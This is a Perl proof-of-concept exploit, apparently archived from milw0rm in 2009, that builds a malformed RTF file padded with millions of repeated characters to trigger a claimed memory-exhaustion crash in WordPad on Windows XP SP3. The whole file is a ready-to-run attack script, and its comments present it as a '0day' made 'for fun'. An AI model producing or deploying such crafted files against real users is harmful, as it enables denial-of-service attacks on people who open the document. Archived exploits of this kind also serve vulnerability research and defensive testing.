#!/usr/bin/perl
#Microsoft Wordpad on WinXP SP3 Memory Exhaustion Vulnerability - 0day
#Works on WinXP SP3!
#bug found by murderkey in Hellcode Labs.
#exploit coded by karak0rsan aka musashi
#Hellcode Resarch
#just a fuckin' lame 0day bug for fun!

$file = "hellcoded.rtf";
$header =
"\x7b\x5c\x72\x74\x66\x31\x5c\x61\x6e\x73\x69\x5c\x61\x6e\x73\x69\x63\x70\x67\x31\x32".
"\x35\x34\x5c\x64\x65\x66\x66\x30\x5c\x64\x65\x66\x6c\x61\x6e\x67\x31\x30\x35\x35\x7b".
"\x5c\x66\x6f\x6e\x74\x74\x62\x6c\x7b\x5c\x66\x30\x5c\x66\x73\x77\x69\x73\x73\x5c\x66".
"\x63\x68\x61\x72\x73\x65\x74\x31\x36\x32\x7b\x5c\x2a\x5c\x66\x6e\x61\x6d\x65\x20\x41".
"\x72\x69\x61\x6c\x3b\x7d\x41\x72\x69\x61\x6c\x20\x54\x55\x52\x3b\x7d\x7d\x0a\x7b\x5c".
"\x2a\x5c\x67\x65\x6e\x65\x72\x61\x74\x6f\x72\x20\x4d\x73\x66\x74\x65\x64\x69\x74\x20".
"\x35\x2e\x34\x31\x2e\x31\x35\x2e\x31\x35\x31\x35\x3b\x7d\x5c\x76\x69\x65\x77\x6b\x69".
"\x6e\x64\x34\x5c\x75\x63\x31\x5c\x70\x61\x72\x64\x5c\x66\x30\x5c\x66\x73\x32\x30";

$subheader = "\x5c\x41\x41\x41\x41\x41\x5c\x41\x41\x41\x41\x5c\x70\x61\x72\x0a\x7d\x0a\x00";
$ekheader = "\x5c\x70\x61\x72\x0a";
$buffer = "A" x 578001;
$buffer2 = "A" x 289000;
$buffer3 = "A" x 18186;
$buffer4 = "A" x 863973;
$buffer5= "A" x 578000;
$memory = $header.$buffer.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer4.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$ekheader.$buffer5.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer2.$ekheader.$buffer3.$subheader;
   open(file, '>' . $file);
   print file $memory;
   close(file);
print "File PoC exploit has created!\n";

exit(); */

# milw0rm.com [2009-08-12]